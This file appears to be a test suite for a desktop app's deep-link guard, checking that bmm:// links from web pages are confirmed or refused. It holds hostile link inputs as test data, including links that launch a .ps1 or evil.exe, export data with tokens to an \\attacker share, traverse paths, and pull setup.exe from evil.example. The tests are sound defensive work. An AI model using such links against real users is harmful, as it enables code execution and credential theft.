// Every bmm:// link is input from a stranger: any web page can fire one.
//
// Before deeplink-guard.ts, `bmm://app/launch?exe=` ran any local path (a .ps1 with
// -ExecutionPolicy Bypass), `bmm://data/export-auto?dir=\\host\share` copied the full data
// file, tokens included, to a network share, and a dozen routes changed persistent state with
// no question. These hold the rules (against the COMPILED module) and the wiring (against the
// handler's source). The Rust half of each hard limit is tested in commands/link_guard.rs.
//
// DLM_SRC=<path> points the wiring checks at another copy of deep_link_manager.ts — how the
// red-before run was made against the previous commit's file.
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { pathToFileURL, fileURLToPath } from 'node:url';
import { join, dirname } from 'node:path';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const G = await import(pathToFileURL(join(ROOT, 'frontend/js/core/deeplink-guard.js')).href);
const { admitLink, decideLink, linkPathRefusal, linkHttpsRefusal, PROMPT_FREE, catalogRoute } = G;

const SHA = 'a'.repeat(64);

/** Runs a link through the gate with a scripted answer; records what the UI was asked. */
async function run(url, origin, answer) {
    const asked = [];
    const refused = [];
    const out = await admitLink(url, origin, {
        confirm: async (p) => { asked.push(p); return answer; },
        refuse: (r) => { refused.push(r); },
    });
    return { out, asked, refused };
}

// One link per Critical/High route that WOULD be admitted if the user said yes.
const GATED = {
    'app/launch': 'bmm://app/launch?id=obs',
    'app/install': `bmm://app/install?id=obs&url=https://example.com/obs.exe&sha256=${SHA}`,
    'catalog/app/install': `bmm://catalog/app/install?name=OBS&url=https://example.com/obs.zip&type=zip&sha256=${SHA}`,
    'catalog/plugin/install': 'bmm://catalog/plugin/install?name=P&url=https://example.com/p.zip',
    'data/export-auto': 'bmm://data/export-auto?dir=C:%5CUsers%5Cme%5CBackups',
    'replay/export': 'bmm://replay/export?path=C:%5Cx%5Cs.bmmreplay',
    'recorder/set': 'bmm://recorder/set?on=1',
    'discord/rpc': 'bmm://discord/rpc?enabled=1',
    'launchpack/run': 'bmm://launchpack/run?id=lp1',
    'plugin/delete': 'bmm://plugin/delete?id=p1',
    'repo/publish-ssh': 'bmm://repo/publish-ssh?dir=C:%5Cexport',
    'catalog/follow': 'bmm://catalog/follow?type=theme&url=https://example.com/c.json',
    'catalog/import': 'bmm://catalog/import?url=https://example.com/c.json',
    'repo/connect': 'bmm://repo/connect?url=https://example.com/repo&password=pw',
    'language/import-inline': 'bmm://language/import-inline?data=e30&code=xx',
    'theme/import': 'bmm://theme/import?url=https://example.com/t.json',
    'theme/import-inline': 'bmm://theme/import-inline?data=e30',
};

describe('nothing is admitted without the in-app answer', () => {
    for (const [route, url] of Object.entries(GATED)) {
        test(`${route}: Cancel admits nothing, and the dialog was shown`, async () => {
            const r = await run(url, 'external', false);
            assert.equal(r.out, null, `${route} was admitted although the user cancelled`);
            assert.equal(r.asked.length, 1, `${route} never asked`);
            assert.equal(r.asked[0].origin, 'external');
            assert.ok(r.asked[0].target, 'the dialog must show the exact target');
        });
        test(`${route}: an origin that is not the app itself asks too`, async () => {
            for (const o of ['theme', 'panel', 'unknown', undefined, 'made-up']) {
                const r = await run(url, o, false);
                assert.equal(r.out, null, `${route} from ${o}`);
                assert.equal(r.asked.length, 1, `${route} from ${o}`);
            }
        });
    }

    test('a dialog that throws or answers anything but true admits nothing', async () => {
        for (const ans of [undefined, 1, 'yes', null]) {
            const r = await run(GATED['app/launch'], 'external', ans);
            assert.equal(r.out, null);
        }
        const out = await admitLink(GATED['app/launch'], 'external', {
            confirm: async () => { throw new Error('modal missing'); }, refuse() {},
        });
        assert.equal(out, null);
    });

    test('downloads show their host on its own line', async () => {
        const r = await run(GATED['catalog/plugin/install'], 'external', false);
        assert.equal(r.asked[0].host, 'example.com');
    });
});

describe('hard limits refuse even when the user would say yes', () => {
    const REFUSED = [
        ['bmm://app/launch?id=x&exe=C:%5Ctools%5Cevil.exe', 'exe-param'],
        ['bmm://app/launch?id=x&exe=C:%5Cx%5Crun.ps1', 'exe-param'],
        [`bmm://app/install?id=x&url=https://e.com/run.ps1&sha256=${SHA}`, 'script'],
        [`bmm://app/install?id=x&url=https://e.com/a.exe&type=script&sha256=${SHA}`, 'script'],
        [`bmm://app/install?id=x&url=http://e.com/a.exe&sha256=${SHA}`, 'not-https'],
        [`bmm://app/install?id=x&url=file:///C:/a.exe&sha256=${SHA}`, 'not-https'],
        ['bmm://app/install?id=x&url=https://e.com/a.exe', 'no-checksum'],
        [`bmm://app/install?id=..%5C..%5Cx&url=https://e.com/a.exe&sha256=${SHA}`, 'bad-id'],
        [`bmm://app/install?id=x&url=https://e.com/a.exe&sha256=${SHA}&path=%5C%5Cattacker%5Cshare`, 'network'],
        [`bmm://catalog/app/install?name=x&url=https://e.com/a.bat&sha256=${SHA}`, 'script'],
        ['bmm://catalog/plugin/install?url=http://e.com/p.zip', 'not-https'],
        ['bmm://catalog/plugin/install?url=https://u:p@e.com/p.zip', 'credentials'],
        ['bmm://data/export-auto?dir=%5C%5Cattacker%5Cshare', 'network'],
        ['bmm://data/export-auto?dir=//attacker/share', 'network'],
        ['bmm://data/export-auto?dir=backups', 'relative'],
        ['bmm://data/export-auto?dir=C:%5Cx%5C..%5C..%5CWindows', 'traversal'],
        ['bmm://replay/export?path=%5C%5Cattacker%5Cs%5Cr.bmmreplay', 'network'],
        ['bmm://repo/publish-ssh?dir=%5C%5Cattacker%5Cshare', 'network'],
        ['bmm://repo/fetch-ssh?dir=%5C%5Cattacker%5Cshare', 'network'],
        ['bmm://catalog/publish?kind=theme&dir=%5C%5Cattacker%5Cs', 'network'],
        ['bmm://language/import?path=%5C%5Cattacker%5Cs%5Cen.json', 'network'],
        ['bmm://replay/import?path=%5C%5Cattacker%5Cs%5Cr.bmmreplay', 'network'],
        ['bmm://repo/connect?url=https://e.com/r&key=main', 'key-from-link'],
        ['bmm://repo/connect?url=https://e.com/r&key=main&passphrase=x', 'key-from-link'],
        ['bmm://repo/sync?url=https://e.com/r&profile=p&key=main', 'key-from-link'],
        ['bmm://catalog/follow?type=theme&url=https://e.com/c.json&key=k', 'key-from-link'],
        ['bmm://catalog/import?url=https://e.com/c.json&passphrase=x', 'key-from-link'],
        ['bmm://catalog/follow?type=theme&url=http://e.com/c.json', 'not-https'],
        ['bmm://theme/import?url=http://e.com/t.json', 'not-https'],
        ['bmm://install?url=http://e.com/mod.zip', 'not-https'],
        ['bmm://repo/connect?url=file:///C:/x', 'bad-scheme'],
    ];
    for (const [url, reason] of REFUSED) {
        test(`${url} → ${reason}`, async () => {
            const r = await run(url, 'external', true);
            assert.equal(r.out, null, 'admitted');
            assert.equal(r.asked.length, 0, 'a hard limit must not even ask');
            assert.equal(r.refused.length, 1);
            assert.equal(r.refused[0].reason, reason);
        });
    }

    test('a program path is refused from EVERY origin, the app\'s own included', async () => {
        for (const o of ['scheduler', 'api', 'self', 'external']) {
            const r = await run('bmm://app/launch?id=x&exe=C:%5Cx.exe', o, true);
            assert.equal(r.out, null, o);
        }
    });

    test('unmasked recording is dropped for every origin; the rest still asks', async () => {
        for (const o of ['external', 'scheduler']) {
            const r = await run('bmm://recorder/set?on=1&full=1', o, true);
            assert.ok(r.out, o);
            assert.equal(r.out.params.has('full'), false, `full=1 survived from ${o}`);
            assert.deepEqual(r.out.dropped, ['full']);
        }
        const ext = await run('bmm://recorder/set?on=1&full=1', 'external', true);
        assert.ok(ext.asked[0].notes.includes('dlg.note.fullDropped'));
        // Masking back ON is allowed.
        const back = await run('bmm://recorder/set?full=0', 'external', true);
        assert.equal(back.out.params.get('full'), '0');
    });

    test('replay/export from outside never keeps a link-chosen path (save dialog instead)', async () => {
        const r = await run(GATED['replay/export'], 'external', true);
        assert.ok(r.out);
        assert.equal(r.out.params.has('path'), false);
        const s = await run(GATED['replay/export'], 'scheduler', true);
        assert.equal(s.out.params.get('path'), 'C:\\x\\s.bmmreplay', 'a scheduled task keeps its own path');
    });

    test('discord/rpc on says what becomes public', async () => {
        const r = await run(GATED['discord/rpc'], 'external', false);
        assert.ok(r.asked[0].notes.includes('dlg.note.rpcPublic'));
    });

    test('data/export-auto from outside is announced as redacted and picked by the user', async () => {
        const r = await run(GATED['data/export-auto'], 'external', false);
        assert.ok(r.asked[0].notes.includes('dlg.note.redacted'));
        assert.ok(r.asked[0].notes.includes('dlg.note.picker'));
    });
});

describe('the app\'s own callers are not asked', () => {
    test('scheduler and API pass without a dialog', async () => {
        for (const o of ['scheduler', 'api']) {
            const r = await run(GATED['data/export-auto'], o, false);
            assert.ok(r.out, o);
            assert.equal(r.asked.length, 0);
            assert.equal(r.out.trusted, true);
        }
    });
    test('an API caller may still name a signing key', async () => {
        const r = await run('bmm://catalog/follow?type=theme&url=https://e.com/c.json&key=k', 'api', false);
        assert.ok(r.out);
    });
});

describe('every route has a decision', () => {
    const map = JSON.parse(readFileSync(join(ROOT, 'frontend/deeplinks.json'), 'utf8'));
    const SAMPLE = new URLSearchParams({
        id: 'x', url: 'https://example.com/a.zip', sha256: SHA, dir: 'C:\\out', path: 'C:\\in\\f.json',
        name: 'n', code: 'c', data: 'e30', enabled: '1', on: '1', method: 'POST', type: 'theme', mode: 'auto',
        kind: 'theme', profile: 'p',
    });
    test('the map is readable', () => assert.ok(map.length > 30));
    for (const { action } of map) {
        test(action, () => {
            if (PROMPT_FREE.has(action)) return;
            const d = decideLink(action, SAMPLE, 'external');
            assert.ok(d.prompt || d.refuse,
                `${action} changes nothing? Either it asks (deeplink-guard.ts decideLink) or it is listed, with its reason, in PROMPT_FREE`);
        });
    }
});

// The gate matches an action WHOLE; the handler used to dispatch the two catalogue families
// on a prefix and a suffix. `bmm://catalog/app/x/install` therefore reached the app installer
// — which downloads the payload and RUNS it (`install_app` launches every `.msi` and anything
// whose filename says setup/install) — while the gate had shown no dialog and applied no hard
// limit, because it had never heard of that action. One parser now answers for both.
describe('a catalogue action the gate does not know is refused, not passed on', () => {
    const SMUGGLED = [
        `bmm://catalog/app/x/install?name=Foo&type=msi&url=https://evil.example/p.msi&sha256=${SHA}`,
        `bmm://catalog/app/x/y/install?name=Foo&url=https://evil.example/setup.exe&sha256=${SHA}`,
        'bmm://catalog/plugin/x/install?url=https://evil.example/p.zip',
        'bmm://catalog/theme/x/install?url=http://evil.example/t.json',
        'bmm://catalog/app/x/add-source?url=http://evil.example/c.json',
        'bmm://catalog/mod/install?url=https://evil.example/p.zip',
    ];
    for (const url of SMUGGLED) {
        test(url, async () => {
            const r = await run(url, 'external', true);
            assert.equal(r.out, null, 'admitted an action no rule decided on');
            assert.equal(r.asked.length, 0, 'a hard limit must not even ask');
            assert.equal(r.refused[0]?.reason, 'unknown-action');
        });
    }

    test('the real catalogue routes still work exactly as before', async () => {
        const ok = await run(`bmm://catalog/app/install?name=OBS&url=https://example.com/obs.zip&type=zip&sha256=${SHA}`, 'external', true);
        assert.ok(ok.out, 'catalog/app/install must still be admitted after the answer');
        assert.equal(ok.asked.length, 1);
        // add-source carries its own dialog in the handler, so the gate lets it through.
        const src = await run('bmm://catalog/theme/add-source?url=https://example.com/c.json', 'external', true);
        assert.ok(src.out);
        for (const a of ['catalog/follow', 'catalog/entry', 'catalog/delete', 'catalog/publish']) {
            assert.equal(catalogRoute(a), null, `${a} is two segments and must not parse as a kind route`);
        }
    });

    test('one parser, so the gate and the handler cannot read a link differently', () => {
        assert.deepEqual(catalogRoute('catalog/app/install'), { kind: 'app', verb: 'install' });
        assert.deepEqual(catalogRoute('catalog/plugin/add-source'), { kind: 'plugin', verb: 'add-source' });
        for (const a of ['catalog/app/x/install', 'catalog/mod/install', 'catalog//install', 'catalog/App/install']) {
            assert.equal(catalogRoute(a), null, a);
        }
        // The handler must dispatch on that parser, not on a prefix of the action.
        const src = readFileSync(process.env.DLM_SRC || join(ROOT, 'frontend/src/core/deep_link_manager.ts'), 'utf8');
        assert.doesNotMatch(src, /action\.startsWith\('catalog\//,
            'the handler dispatches a catalogue route on a prefix the gate never matched');
        assert.match(src, /catalogRoute\(action\)/);
    });
});

describe('path and URL predicates (mirrors commands/link_guard.rs)', () => {
    test('network paths', () => {
        for (const p of ['\\\\h\\s', '//h/s', '\\\\?\\C:\\x', '\\\\.\\pipe\\x', 'file://h/s', 'smb://h/s']) {
            assert.equal(linkPathRefusal(p), 'network', p);
        }
    });
    test('local absolute paths pass', () => {
        assert.equal(linkPathRefusal('C:\\Users\\me\\Backups'), null);
        assert.equal(linkPathRefusal('D:/BMM/out'), null);
        assert.equal(linkPathRefusal('C:out'), 'relative');
        assert.equal(linkPathRefusal('C:\\x\\f.json:ads'), 'invalid');
    });
    test('https only', () => {
        assert.equal(linkHttpsRefusal('https://example.com/x'), null);
        assert.equal(linkHttpsRefusal('http://example.com/x'), 'not-https');
        assert.equal(linkHttpsRefusal('https://'), 'no-host');
    });
});

describe('the handler is wired through the gate', () => {
    const SRC = process.env.DLM_SRC || join(ROOT, 'frontend/src/core/deep_link_manager.ts');
    const src = readFileSync(SRC, 'utf8');
    const branch = (a, b) => {
        const s = src.indexOf(a);
        const e = src.indexOf(b, s + a.length);
        return s < 0 ? '' : src.slice(s, e < 0 ? undefined : e);
    };

    test('admitLink runs before any route is dispatched', () => {
        const fn = src.slice(src.indexOf('async function handleDeepLink'));
        const gate = fn.indexOf('admitLink(');
        const first = fn.search(/if\s*\(\s*action\s*===/);
        assert.ok(gate > 0, 'handleDeepLink never calls admitLink');
        assert.ok(gate < first, 'a route is dispatched before the gate');
    });

    test('OS links are marked external', () => {
        assert.match(src, /listen\('deep-link-received'[\s\S]{0,200}handleDeepLink\(event\.payload,\s*'external'\)/);
    });

    test('the dialog makes Cancel the default', () => {
        assert.match(src, /defaultCancel:\s*true/);
    });

    test('link routes never reach the unrestricted commands', () => {
        assert.doesNotMatch(src, /invoke\('launch_app'/, 'app/launch still runs a link-chosen path');
        assert.doesNotMatch(src, /invoke\('install_app'/, 'a link still installs through the unrestricted command');
        assert.doesNotMatch(src, /invoke\('install_plugin'/, 'a link still installs a plugin enabled, unchecked');
        assert.match(src, /invoke\('link_launch_app'/);
        assert.match(src, /invoke\('link_install_app'/);
        assert.match(src, /invoke\('link_install_plugin'/);
    });

    test('data/export-auto writes the full file only for the app\'s own callers', () => {
        const b = branch("action === 'data/export-auto'", "action === 'replay/import'");
        assert.ok(b, 'branch not found');
        assert.match(b, /if \(trusted\) dest = await invoke\('export_app_data_auto'/);
        assert.match(b, /link_export_app_data/);
    });

    test('repo/connect applies nothing before the question', () => {
        const b = branch("action === 'repo/connect'", "action === 'repo/sync'");
        assert.ok(b, 'branch not found');
        assert.doesNotMatch(b, /confirmCustom/, 'repo/connect asks AFTER applying the credentials');
    });

    test('the theme editor does not replace the real handler', () => {
        const te = readFileSync(join(ROOT, 'frontend/src/features/themes/theme-editor.ts'), 'utf8');
        assert.doesNotMatch(te, /window as any\)\.__bmmDeeplink\s*=/);
    });
});
